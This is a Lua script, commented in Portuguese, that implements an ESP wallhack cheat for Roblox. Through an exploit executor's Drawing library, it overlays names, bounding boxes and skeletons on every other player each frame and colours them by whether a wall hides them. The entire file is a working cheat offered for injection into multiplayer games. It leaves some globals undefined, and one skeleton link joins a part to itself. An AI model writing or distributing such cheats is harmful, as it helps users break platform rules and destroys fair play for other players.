-- ==================== ESP MELHORADO: Name + Box + Skeleton + Wall Check ====================

local ESP_ENABLED = false
local SHOW_NAME = true
local SHOW_BOX = true
local SHOW_SKELETON = true

local visibleColor = Color3.fromRGB(0, 255, 0)    -- Verde = visível
local hiddenColor  = Color3.fromRGB(255, 0, 0)    -- Vermelho = atrás de parede

local espObjects = {}   -- Armazena drawings por player

-- Checa se tem parede na frente (visibilidade)
local function isVisible(targetChar)
    if not targetChar or not targetChar:FindFirstChild("Head") then return false end
    local origin = Camera.CFrame.Position
    local target = targetChar.Head.Position
    local direction = target - origin

    local rayParams = RaycastParams.new()
    rayParams.FilterDescendantsInstances = {LocalPlayer.Character, targetChar}
    rayParams.FilterType = Enum.RaycastFilterType.Blacklist
    rayParams.IgnoreWater = true

    return workspace:Raycast(origin, direction, rayParams) == nil
end

-- Cria os drawings para um player
local function createESP(player)
    if espObjects[player] then return end

    local d = {
        name = Drawing.new("Text"),
        box = Drawing.new("Square"),
        boxOutline = Drawing.new("Square"),
        lines = {}
    }

    -- Name
    d.name.Size = 15
    d.name.Center = true
    d.name.Outline = true
    d.name.OutlineColor = Color3.new(0,0,0)
    d.name.Font = Drawing.Fonts.Plex
    d.name.Visible = false

    -- Box
    d.box.Thickness = 2
    d.box.Filled = false
    d.box.Visible = false

    d.boxOutline.Thickness = 3
    d.boxOutline.Color = Color3.new(0,0,0)
    d.boxOutline.Transparency = 0.6
    d.boxOutline.Filled = false
    d.boxOutline.Visible = false

    -- Skeleton connections (melhor R15 + R6 fallback)
    local connections = {
        {"Head", "UpperTorso"}, {"UpperTorso", "LowerTorso"},
        {"UpperTorso", "RightUpperArm"}, {"RightUpperArm", "RightLowerArm"}, {"RightLowerArm", "RightHand"},
        {"UpperTorso", "LeftUpperArm"},  {"LeftUpperArm", "LeftLowerArm"},  {"LeftLowerArm", "LeftHand"},
        {"LowerTorso", "RightUpperLeg"}, {"RightUpperLeg", "RightLowerLeg"}, {"RightLowerLeg", "RightFoot"},
        {"LowerTorso", "LeftUpperLeg"},  {"LeftUpperLeg", "LeftLowerLeg"},  {"LeftLowerLeg", "LeftFoot"}
    }

    -- Fallback para R6
    if player.Character and player.Character:FindFirstChild("Torso") then
        connections = {
            {"Head", "Torso"},
            {"Torso", "Right Arm"}, {"Right Arm", "Right Arm"}, -- simplificado
            {"Torso", "Left Arm"},
            {"Torso", "Right Leg"},
            {"Torso", "Left Leg"}
        }
    end

    for _, conn in ipairs(connections) do
        local line = Drawing.new("Line")
        line.Thickness = 2
        line.Transparency = 1
        line.Visible = false
        table.insert(d.lines, {line = line, p1 = conn[1], p2 = conn[2]})
    end

    espObjects[player] = d
end

-- Atualização do ESP todo frame
RunService.RenderStepped:Connect(function()
    if not ESP_ENABLED then
        for _, d in pairs(espObjects) do
            d.name.Visible = false
            d.box.Visible = false
            d.boxOutline.Visible = false
            for _, l in ipairs(d.lines) do l.line.Visible = false end
        end
        return
    end

    for _, player in pairs(Players:GetPlayers()) do
        if player == LocalPlayer or not player.Character then continue end

        local char = player.Character
        local head = char:FindFirstChild("Head")
        local root = char:FindFirstChild("HumanoidRootPart") or char:FindFirstChild("Torso")
        if not head or not root then continue end

        local visible = isVisible(char)
        local espColor = visible and visibleColor or hiddenColor

        createESP(player)
        local d = espObjects[player]

        -- World to Viewport
        local headScreen, onScreen = Camera:WorldToViewportPoint(head.Position)
        if not onScreen then
            d.name.Visible = false
            d.box.Visible = false
            d.boxOutline.Visible = false
            for _, l in ipairs(d.lines) do l.line.Visible = false end
            continue
        end

        -- Name ESP
        if SHOW_NAME then
            d.name.Text = player.DisplayName
            d.name.Position = Vector2.new(headScreen.X, headScreen.Y - 30)
            d.name.Color = espColor
            d.name.Visible = true
        else
            d.name.Visible = false
        end

        -- Box ESP
        if SHOW_BOX and root then
            local rootScreen = Camera:WorldToViewportPoint(root.Position)
            local height = (Camera:WorldToViewportPoint(root.Position + Vector3.new(0, 3, 0)).Y - rootScreen.Y) * 2
            local width = height * 0.65

            d.box.Size = Vector2.new(width, height)
            d.box.Position = Vector2.new(rootScreen.X - width/2, rootScreen.Y - height/2 + 5)
            d.box.Color = espColor
            d.box.Visible = true

            d.boxOutline.Size = d.box.Size
            d.boxOutline.Position = d.box.Position
            d.boxOutline.Visible = true
        else
            d.box.Visible = false
            d.boxOutline.Visible = false
        end

        -- Skeleton ESP
        if SHOW_SKELETON then
            for _, bone in ipairs(d.lines) do
                local part1 = char:FindFirstChild(bone.p1)
                local part2 = char:FindFirstChild(bone.p2)
                if part1 and part2 then
                    local p1, v1 = Camera:WorldToViewportPoint(part1.Position)
                    local p2, v2 = Camera:WorldToViewportPoint(part2.Position)
                    if v1 and v2 then
                        bone.line.From = Vector2.new(p1.X, p1.Y)
                        bone.line.To = Vector2.new(p2.X, p2.Y)
                        bone.line.Color = espColor
                        bone.line.Visible = true
                    else
                        bone.line.Visible = false
                    end
                else
                    bone.line.Visible = false
                end
            end
        else
            for _, bone in ipairs(d.lines) do bone.line.Visible = false end
        end
    end
end)

